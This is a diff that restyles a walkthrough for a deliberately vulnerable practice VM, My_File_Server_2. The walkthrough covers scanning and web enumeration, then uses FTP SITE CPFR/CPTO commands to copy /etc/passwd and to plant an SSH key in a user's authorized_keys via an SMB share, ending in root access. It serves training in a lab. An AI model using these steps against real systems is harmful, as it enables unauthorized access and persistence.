@@ -1,222 +1,264 @@
-<div class="page">
-
 # My_File_Server_2
 
-\
+## Machine Information
 
-## 
+- **Machine:** My_File_Server_2
+- **Platform:** Offensive Pentesting Lab
+- **Repository:** https://github.com/InfoSecWarrior/Offensive-Pentesting-Lab/tree/main/Vulnerable-OVA
 
-## My_File_Server_2
+---
 
-- **<span style="color:#cdab8f;">My_File_Server_2</span>** :-
+# Lab Setup
 
-<!-- -->
+1. Download the vulnerable machine from the repository.
+2. Import the OVA into VirtualBox.
+3. Start the virtual machine.
 
-- Go to repo :
-  <https://github.com/InfoSecWarrior/Offensive-Pentesting-Lab/tree/main/Vulnerable-OVA>
-- Download the machine .
+---
 
-<!-- -->
+# Network Enumeration
 
-- Import the machine in virtual box .
+## Discover the Target
 
-<!-- -->
-
-- Find the machine ip :
-
-<div class="codebox">
-
-    nmap -sn 192.168.2.0/24 
-
-</div>
+```bash
+nmap -sn 192.168.2.0/24
+```
 
 ![](images/10-1.png)
 
-- Find the available port :
+---
 
-<div class="codebox">
+## Port Scan
 
-    nmap -v -p- 192.168.2.240
-
-</div>
+```bash
+nmap -v -p- 192.168.2.240
+```
 
 ![](images/10-2.png)
 
-- Visit the ip in browser : <http://192.168.2.240/>
+---
 
-<!-- -->
+# Web Enumeration
 
-- Find the hidden endpoints :
+Visit the target.
 
-<div class="codebox">
+```
+http://192.168.2.240/
+```
 
-    feroxbuster -u http://192.168.2.240/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+---
 
-</div>
+## Directory Enumeration
+
+```bash
+feroxbuster \
+-u http://192.168.2.240/ \
+-w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+```
 
 ![](images/10-3.png)
 
-- Visit the endpoints : <http://192.168.2.240/index.html>
-  <http://192.168.2.240/readme.txt>
+---
+
+## Interesting Files
+
+```
+http://192.168.2.240/index.html
+http://192.168.2.240/readme.txt
+```
 
 ![](images/10-4.png)
 
-- Now try to login ftp :
+---
 
-<div class="codebox">
+# FTP Enumeration
 
-    ftp 192.168.2.240
+## Connect to the Default FTP Service
 
-</div>
+```bash
+ftp 192.168.2.240
+```
 
-![](images/10-5.png) Show the vsFTPd version .
+The server reveals the **vsFTPd** version.
 
-<div class="codebox">
+![](images/10-5.png)
 
-    ftp 192.168.2.240 2121
+---
 
-</div>
+## Connect to FTP on Port 2121
+
+```bash
+ftp 192.168.2.240 2121
+```
 
 ![](images/10-6.png)
 
-<div class="codebox">
+Reconnect if required.
 
-    ftp 192.168.2.240 2121
-
-</div>
+```bash
+ftp 192.168.2.240 2121
+```
 
 ![](images/10-7.png)
 
-- Now again login port 2121 and run the command :
+---
 
-<div class="codebox">
+## FTP Commands
 
-    ftp 192.168.2.240 2121
+Display the available FTP commands.
 
-</div>
+```text
+help
+```
 
-<div class="codebox">
+Display SITE commands.
 
-    help
+```text
+site help
+```
 
-</div>
+Copy the system password file.
 
-<div class="codebox">
+```text
+site cpfr /etc/passwd
+```
 
-    site help
-
-</div>
-
-<div class="codebox">
-
-    site cpfr /etc/passwd
-
-</div>
-
-<div class="codebox">
-
-    site cpto /var/ftp/pub/passwd
-
-</div>
+```text
+site cpto /var/ftp/pub/passwd
+```
 
 ![](images/10-8.png)
 
-- Now exit and again login :
+---
+
+## Retrieve the Password File
+
+Reconnect to FTP.
 
 ![](images/10-9.png)
 
-- Now download the passwd file and see the content :
+Download the copied `passwd` file and inspect its contents.
 
-![](images/10-10.png) Here the passwd file content .
+![](images/10-10.png)
 
-- Now try to login smbuser in ftp :
+---
+
+## Attempt FTP Login
+
+Try logging in with the **smbuser** account.
 
 ![](images/10-11.png)
 
-- Anonymous check with smbclient :
+---
 
-<div class="codebox">
+# SMB Enumeration
 
-    smbclient -L //192.168.2.240
+## List SMB Shares
 
-</div>
+```bash
+smbclient -L //192.168.2.240
+```
 
 ![](images/10-12.png)
 
-<div class="codebox">
+---
 
-    smbclient //192.168.2.240/smbdata
+## Connect to the SMB Share
 
-</div>
+```bash
+smbclient //192.168.2.240/smbdata
+```
 
 ![](images/10-13.png)
 
-- Now generate rsa_key :
+---
 
-<div class="codebox">
+# SSH Key Generation
 
-    ssh-keygen -b 2048 -t rsa -f id_rsa -q -N ""
+Generate an RSA key pair.
 
-</div>
+```bash
+ssh-keygen -b 2048 -t rsa -f id_rsa -q -N ""
+```
 
 ![](images/10-14.png)
 
-- Login with smb user and put the rsa file :
+---
 
-<div class="codebox">
+## Upload the Public Key
 
-    smbclient //192.168.2.240/smbdata
+Connect to the SMB share.
 
-</div>
+```bash
+smbclient //192.168.2.240/smbdata
+```
+
+Upload the generated `id_rsa.pub` file.
 
 ![](images/10-15.png)
 
-- Login FTP and rsa_key file transfer in smbdata :
+---
 
-<div class="codebox">
+# Copy the Public Key Using FTP
 
-    ftp 192.168.2.240 2121
+Reconnect to FTP on port **2121**.
 
-</div>
+```bash
+ftp 192.168.2.240 2121
+```
 
-- 
+Display available SITE commands.
 
-<div class="codebox">
+```text
+site help
+```
 
-    site help
+Copy the uploaded public key.
 
-</div>
+```text
+site cpfr /smbdata/id_rsa.pub
+```
 
-- 
+Move it to the SSH authorized keys location.
 
-<div class="codebox">
-
-    site cpfr /smbdata/id_rsa.pub
-
-</div>
-
-- 
-
-<div class="codebox">
-
-    site cpto /home/smbuser/.ssh/authorized_keys
-
-</div>
+```text
+site cpto /home/smbuser/.ssh/authorized_keys
+```
 
 ![](images/10-16.png)
 
-- Now login with ssh :
+---
 
-<div class="codebox">
+# SSH Access
 
-    ssh -i id_rsa smbuser@192.168.2.240
+Login using the generated private key.
 
-</div>
+```bash
+ssh -i id_rsa smbuser@192.168.2.240
+```
 
 ![](images/10-17.png)
 
-- Login with root :
+---
+
+# Root Access
+
+After obtaining shell access, switch to the root account.
 
 ![](images/10-18.png)
 
-</div>
+---
+
+# Attack Flow
+
+1. Discover the target.
+2. Enumerate open ports.
+3. Enumerate the web server.
+4. Enumerate the FTP service.
+5. Copy `/etc/passwd` using FTP SITE commands.
+6. Enumerate SMB shares.
+7. Generate an SSH key pair.
+8. Upload the public key to the SMB share.
+9. Copy the public key into `authorized_keys`.
+10. Login via SSH.
+11. Obtain root access.
